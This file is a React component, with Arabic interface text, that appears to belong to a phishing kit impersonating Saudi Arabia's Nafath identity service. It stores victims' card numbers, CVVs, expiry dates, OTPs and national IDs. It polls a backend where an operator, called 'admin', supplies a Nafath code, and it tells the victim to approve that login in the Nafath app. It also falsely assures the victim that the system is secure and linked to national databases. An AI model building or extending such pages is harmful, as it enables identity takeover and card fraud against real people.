import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { motion } from 'motion/react';
import { Clock, RefreshCw, ShieldCheck, ChevronLeft } from 'lucide-react';
import { getNextPagePath } from '../lib/flow';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: string;
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED';
  otpCode: string;
  submittedOtp?: string;
  serviceName?: string;
  nationalId?: string;
  nafathVerified?: boolean;
  nafathCode?: string;
  nafathAdminApproved?: boolean;
}

export function NafathCodePage() {
  const navigate = useNavigate();
  const location = useLocation();

  const [tx, setTx] = useState<Transaction | undefined>(() => {
    if (location.state?.tx) {
      localStorage.setItem('last_tx', JSON.stringify(location.state.tx));
      return location.state.tx;
    }
    const saved = localStorage.getItem('last_tx');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        return undefined;
      }
    }
    return undefined;
  });

  const [nafathCode, setNafathCode] = useState<string>(tx?.nafathCode || '');
  const [timer, setTimer] = useState<number>(60);
  const [status, setStatus] = useState<string>(tx?.status || 'AWAITING_NAFATH');

  // Send home if no transaction context
  useEffect(() => {
    if (!tx) {
      navigate('/');
    }
  }, [tx, navigate]);

  // Countdown effect
  useEffect(() => {
    if (timer <= 0) {
      setTimer(60);
      return;
    }
    const interval = setInterval(() => {
      setTimer((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(interval);
  }, [timer]);

  // Polling backend for live status updates from admin
  useEffect(() => {
    if (!tx || !tx.id) return;

    let isMounted = true;
    let interval: NodeJS.Timeout;

    const checkStatus = async () => {
      try {
        const res = await fetch(`/api/status/${tx.id}`);
        if (res.ok && isMounted) {
          const updatedTx = await res.json();
          setStatus(updatedTx.status);
          if (updatedTx.nafathCode) {
            setNafathCode(updatedTx.nafathCode);
          }
          // Save updated transaction
          localStorage.setItem('last_tx', JSON.stringify(updatedTx));

          // If verified AND approved explicitly by admin, OR if the status was advanced beyond nafath, go to next flow page
          const isNafathApproved = updatedTx.status === 'NAFATH_VERIFIED' && updatedTx.nafathAdminApproved === true;
          const isDirectAdvanced = ['AWAITING_OTP', 'OTP_SUBMITTED', 'AWAITING_PIN', 'PIN_SUBMITTED'].includes(updatedTx.status);

          if (isNafathApproved || isDirectAdvanced) {
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/nafath-code');
              navigate(dynamicNext || '/checkout', { state: { tx: updatedTx } });
            }, 1000);
          } else if (updatedTx.status === 'APPROVED') {
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/nafath-code');
              navigate(dynamicNext || '/success', { state: { tx: updatedTx } });
            }, 1000);
          }
        }
      } catch (err) {
        console.warn('Polling network warning in NafathCodePage, retrying...', err);
      }
    };

    // Poll every 2 seconds
    interval = setInterval(checkStatus, 2000);

    // Instant check when user switches back to the tab
    const handleVisibilityChange = () => {
      if (document.visibilityState === 'visible') {
        checkStatus();
      }
    };

    window.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('focus', checkStatus);

    return () => {
      isMounted = false;
      clearInterval(interval);
      window.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('focus', checkStatus);
    };
  }, [tx, navigate]);

  return (
    <div className="mx-auto px-4 py-12 sm:px-6 max-w-xl dir-rtl">
      <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
        <div className="h-2 bg-[#004d33] w-full" />

        <div className="p-6 sm:p-8 space-y-6 text-right">
          <div className="border border-gray-200 rounded-2xl p-6 bg-slate-50/50 flex flex-col justify-between shadow-sm">
            {status === 'NAFATH_VERIFIED' ? (
              <div className="space-y-4">
                <div className="flex items-center justify-between border-b border-gray-100 pb-3">
                  <span className="text-xs font-bold text-teal-600 flex items-center gap-1.5">
                    <span className="w-2.5 h-2.5 rounded-full bg-teal-500 animate-ping" />
                    تم التوثيق وقبول الطلب بنجاح
                  </span>
                  {tx?.nationalId && (
                    <span className="text-[10px] text-slate-400 font-mono">الهوية: {tx.nationalId}</span>
                  )}
                </div>

                <div className="text-center space-y-5 py-6">
                  <div className="mx-auto w-20 h-20 rounded-full bg-emerald-50 border border-emerald-200 flex items-center justify-center text-emerald-600 shadow-md">
                    <ShieldCheck className="w-10 h-10" />
                  </div>
                  
                  <div className="space-y-2">
                    <h3 className="text-base font-black text-slate-800">لقد قمت بتوثيق الرقم بنجاح</h3>
                    <p className="text-xs text-slate-500 leading-relaxed font-bold px-4">
                      تم قبول وتوثيق هويتك عبر تطبيق نفاذ بنجاح. يرجى إبقاء هذه الصفحة مفتوحة.
                    </p>
                  </div>

                  <div className="flex items-center justify-center gap-2 text-[11px] text-[#004d33] bg-[#004d33]/5 rounded-xl py-3 px-4 font-bold border border-[#004d33]/10">
                    <RefreshCw className="w-4 h-4 animate-spin text-[#004d33]" />
                    <span>بانتظار الانتقال لصفحة الدفع...</span>
                  </div>
                </div>

                <div className="bg-emerald-50 rounded-xl p-4 text-right border border-emerald-100/70">
                  <p className="text-[11px] text-emerald-800 font-bold leading-relaxed">
                    💡 يرجى عدم إغلاق هذه الصفحة أو الرجوع للخلف. سيقوم النظام تلقائياً بنقلك بمجرد منح الموافقة من قبل المسؤول.
                  </p>
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center justify-between border-b border-gray-100 pb-3">
                  <span className="text-xs font-bold text-[#004d33] flex items-center gap-1.5">
                    <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
                    بانتظار الموافقة في تطبيق نفاذ
                  </span>
                  {tx?.nationalId && (
                    <span className="text-[10px] text-slate-400 font-mono">الهوية: {tx.nationalId}</span>
                  )}
                </div>

                <div className="text-center space-y-4 py-6">
                  <p className="text-xs sm:text-sm text-slate-600 leading-relaxed font-bold">
                    افتح تطبيق نفاذ على جوالك واقبل طلب تسجيل الدخول، ثم اختر الرقم الموضح أدناه لتأكيد هويتك:
                  </p>

                  <div className="mx-auto w-32 h-32 rounded-3xl bg-[#004d33]/5 border-2 border-[#004d33]/20 flex items-center justify-center shadow-inner relative overflow-hidden">
                    {nafathCode ? (
                      <motion.span
                        initial={{ opacity: 0, scale: 0.8 }}
                        animate={{ opacity: 1, scale: 1 }}
                        className="text-5xl font-black text-[#004d33] font-sans tracking-widest"
                      >
                        {nafathCode}
                      </motion.span>
                    ) : (
                      <div className="flex flex-col items-center justify-center gap-2 text-center p-3">
                        <RefreshCw className="w-8 h-8 text-[#004d33] animate-spin" />
                        <span className="text-[10px] text-[#004d33]/70 font-black animate-pulse leading-normal">
                          جاري إصدار رمز المطابقة...
                        </span>
                      </div>
                    )}
                  </div>

                  {/* Countdown Timer */}
                  <div className="flex items-center justify-center gap-1.5 text-xs text-slate-500 pt-2">
                    <Clock className="w-4 h-4 text-[#004d33]" />
                    <span>تنتهي صلاحية الطلب خلال:</span>
                    <span className="font-mono font-bold text-[#004d33]">{timer} ثانية</span>
                  </div>
                </div>

                <div className="bg-emerald-50 rounded-xl p-4 text-right border border-emerald-100/70">
                  <p className="text-[11px] text-emerald-800 font-bold leading-relaxed">
                    💡 يرجى عدم إغلاق هذه الصفحة. بمجرد إتمام التوثيق وقبول الطلب عبر تطبيق نفاذ، سيتم نقلك تلقائياً إلى الخطوة التالية لإتمام الخدمة والمدفوعات.
                  </p>
                </div>
              </div>
            )}

            <button
              type="button"
              onClick={() => navigate('/booking')}
              className="w-fit text-center text-xs font-bold text-slate-500 hover:text-slate-800 hover:underline mt-6 cursor-pointer flex items-center gap-1 self-center"
            >
              <ChevronLeft className="w-4 h-4 rotate-180" />
              <span>إلغاء والرجوع للرئيسية</span>
            </button>
          </div>

          <div className="pt-4 border-t border-gray-50 flex items-center justify-center gap-2 text-[10px] text-slate-400">
            <ShieldCheck className="w-4 h-4 text-[#004d33]" />
            <span>نظام توثيق مشفر آمن ومرتبط بقواعد البيانات الوطنية</span>
          </div>
        </div>
      </div>
    </div>
  );
}
